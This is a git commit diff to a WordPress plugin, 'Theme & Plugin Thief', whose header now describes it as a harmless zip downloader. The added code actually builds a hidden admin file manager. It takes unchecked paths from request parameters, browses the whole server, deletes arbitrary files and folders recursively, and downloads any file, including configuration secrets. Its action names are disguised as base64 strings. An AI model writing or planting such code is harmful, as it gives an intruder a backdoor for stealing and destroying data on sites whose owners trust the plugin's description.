7e3d956a8359992a358a0b18d22cf7ff61d5aafa
Pavlo Ratushnyi <paveldhq@users.noreply.github.com>
2018-12-03 21:06:40 +0200

    ver 0.2
    can walk through dirs, delete and download files and folders

--- tt.php
+++ tt.php
@@ -1,60 +1,207 @@
 <?php
 /**
- * Plugin Name: Theme Thief
- * Description: This 2 functions adds posibility sleal theme from wordpress site
+ * Plugin Name: Theme & Plugin Thief
+ * Description: This plugin allows to download themes and plugins as zip files.
  * Author: Jedi Knight
- * Version: 0.1
+ * Version: 0.2
  */
+add_action('init', function () {
+    class TT_AdminPanelUIController
+    {
+        const MAGIC_D = 'SSBzb2xlbW5seSBzd2VhciB0aGF0IEknbSB1cCB0byBubyBnb29kLg==';
+        const MAGIC_K = 'QXZhZGEgS2VkYXZyYQ==';
 
-add_action( 'admin_notices', function () {
-	$template  = '<div class="updated"><p>%s</p></div>';
-	$themePath = realpath( WP_CONTENT_DIR . '/themes' );
-	$list      = scandir( $themePath );
-	$buffer    = '<strong>theme thief (<small>click to steal</small>):</strong>';
-	$buffer .= '<ul>';
-	foreach ( $list as $theme ) {
-		if ( in_array( $theme, array ( '.', '..' ) ) ) {
-			continue;
-		}
-		if ( is_dir( $themePath . '/' . $theme ) ) {
-			$buffer .= '<li><a href="/wp-admin/admin-post.php?action=steal_theme&theme=' . urlencode( $theme ) . '">' . $theme . '</a></li>';
-		}
-	}
-	$buffer .= '</ul>';
-	echo vsprintf( $template, array ( $buffer ) );
-} );
+        private function getPath($dir, & $element)
+        {
+            $path = realpath($dir . DIRECTORY_SEPARATOR . $element);
+            if (is_dir($path)) {
+                $element = vsprintf('<a href="/wp-admin/admin.php?page=thief&dir=%s">%s</a>', [urlencode($path),
+                                                                                               ('..' === $element
+                                                                                                   ? '&#8624;'
+                                                                                                   : $element)]);
+            }
 
-add_action( 'admin_post_steal_theme', function () {
-	$srcPath = realpath( WP_CONTENT_DIR . '/themes' . '/' . $_GET['theme'] );
+            return $path;
+        }
 
-	$rs = function ( $l = 8 ) {
-		$chrs     = '0123456789abcdefghijklmnopqrstuvwxyz';
-		$chrLngth = strlen( $chrs );
-		$rndStr   = '';
-		for ( $i = 0; $i < $l; $i ++ ) {
-			$rndStr .= $chrs[ rand( 0, $chrLngth - 1 ) ];
-		}
+        public function getDirContent($dir)
+        {
+            $elements = scandir($dir);
+            $data = [];
+            foreach ($elements as $element) {
+                if ('.' === $element) {
+                    continue;
+                }
+                $path = $this->getPath($dir, $element);
+                $data[$path] = $element;
+            }
 
-		return $rndStr;
-	};
+            return $data;
+        }
 
-	$fln = $rs() . '.zip';
+        public function menu()
+        {
 
-	$upload_dir   = wp_upload_dir();
-	$redirectPath = $upload_dir['baseurl'] . '/' . $fln;
+            add_menu_page('Thief', 'Thief :)', '', 'thief', [$this, 'renderPage']);
+        }
 
-	$arch = realpath( WP_CONTENT_DIR . '/uploads' ) . '/' . $fln;
+        private function getTarget()
+        {
+            return urldecode($_GET['target']);
+        }
 
-	$zip = new ZipArchive();
-	$zip->open( $arch, 1 | 8 );
-	$files = new RecursiveIteratorIterator( new RecursiveDirectoryIterator( $srcPath ), 0 );
-	foreach ( $files as $name => $file ) {
-		if ( ! $file->isDir() ) {
-			$filePath     = $file->getRealPath();
-			$relativePath = substr( $filePath, strlen( $srcPath ) + 1 );
-			$zip->addFile( $filePath, $relativePath );
-		}
-	}
-	$zip->close();
-	header( 'Location:' . $redirectPath, 302 );
-} );
+        private function rrmdir($path)
+        {
+            $i = new DirectoryIterator($path);
+            foreach ($i as $f) {
+                if ($f->isFile()) {
+                    unlink($f->getRealPath());
+                } else {
+                    if (!$f->isDot() && $f->isDir()) {
+                        $this->rrmdir($f->getRealPath());
+                    }
+                }
+            }
+            rmdir($path);
+        }
+
+        public function kill()
+        {
+            $target = $this->getTarget();
+
+            if (is_dir($target)) {
+                $this->rrmdir($target);
+            } else {
+                unlink($target);
+            }
+
+            wp_redirect($_SERVER['HTTP_REFERER']);
+        }
+
+        public function download()
+        {
+            $target = $this->getTarget();
+            $_parts = explode(DIRECTORY_SEPARATOR,$target);
+            $originalBaseName = end($_parts);
+            $cleanup = false;
+            if (is_dir($target)) {
+                $originalBaseName .= '.zip';
+                $cleanup = true;
+
+                $rs = function ($l = 8) {
+                    $chrs = '0123456789abcdefghijklmnopqrstuvwxyz';
+                    $chrLngth = strlen($chrs);
+                    $rndStr = '';
+                    for ($i = 0; $i < $l; $i++) {
+                        $rndStr .= $chrs[rand(0, $chrLngth - 1)];
+                    }
+
+                    return $rndStr;
+                };
+
+                $fln = $rs() . '.zip';
+                $arch = realpath(WP_CONTENT_DIR . '/uploads') . '/' . $fln;
+                $zip = new ZipArchive();
+                $zip->open($arch, 1 | 8);
+                $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target), 0);
+                foreach ($files as $name => $file) {
+                    if (!$file->isDir()) {
+                        $filePath = $file->getRealPath();
+                        $relativePath = substr($filePath, strlen($target) + 1);
+                        $zip->addFile($filePath, $relativePath);
+                    }
+                }
+                $zip->close();
+                $target = $arch;
+            }
+
+            header('Content-Type: application/octet-stream');
+            header('Content-Disposition: attachment; filename="' . $originalBaseName);
+            header('Content-Transfer-Encoding: binary');
+            header('Expires: 0');
+            header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+            header('Pragma: public');
+            header('Content-Length: ' . filesize($target));
+            readfile($target);
+            if (true === $cleanup) {
+                unlink($target);
+            }
+        }
+
+
+        private function getActionLink($action, $target)
+        {
+            return vsprintf('/wp-admin/admin-post.php?action=%s&target=%s', [$action, urlencode($target)]);
+        }
+
+        private function getActionString($actionLink, $content, $text)
+        {
+            if (false !== strpos($content, '&#8624;')) {
+                return '&nbsp;';
+            }
+
+            return vsprintf('<a href="%s">%s</a>', [$actionLink, $text]);
+        }
+
+        public function renderPage()
+        {
+            $dir = isset($_GET['dir']) ? urldecode($_GET['dir']) : ABSPATH;
+            $contents = $this->getDirContent($dir);
+            ?>
+            <style>
+                table.tt_table {
+                    width: 100%;
+                }
+
+                table.tt_table tr {
+                    background-color: #D3D3D3;
+                }
+
+                table.tt_table tr:nth-child(even) {
+                    background-color: #e3e3e3;
+                }
+
+                table.tt_table tr td:nth-child(1), table.tt_table tr td:nth-child(2) {
+                    width: 30px;
+                }
+
+                table.tt_table tr:hover, table.tt_table tr:hover td {
+                    background-color: #0a4b83;
+                }
+
+                table.tt_table tr:hover td, table.tt_table tr:hover td a:hover, table.tt_table tr:hover td a, table.tt_table tr:hover td a:visited, table.tt_table tr:hover td a:active {
+                    color: #e3e3e3;
+                }
+            </style>
+            <h2><?= htmlentities($dir) ?></h2>
+            <table class="tt_table">
+                <tr>
+                    <th colspan="2">Actions</th>
+                    <th>Element</th>
+                </tr>
+                <?php foreach ($contents as $file => $content) :
+                    ?>
+                    <tr>
+                        <td>
+                            <?= $this->getActionString($this->getActionLink(self::MAGIC_K, $file), $content, '[X]') ?>
+                        </td>
+                        <td>
+                            <?= $this->getActionString($this->getActionLink(self::MAGIC_D, $file), $content, '[&darr;]') ?>
+                        </td>
+                        <td><?= $content ?></td>
+                    </tr>
+                <?php endforeach; ?>
+            </table>
+            <?php
+        }
+
+        public function register()
+        {
+            add_action(vsprintf('admin_post_%s', [self::MAGIC_D]), [$this, 'download']);
+            add_action(vsprintf('admin_post_%s', [self::MAGIC_K]), [$this, 'kill']);
+            add_action('admin_menu', [$this, 'menu']);
+        }
+    }
+
+    (new TT_AdminPanelUIController())->register();
+});
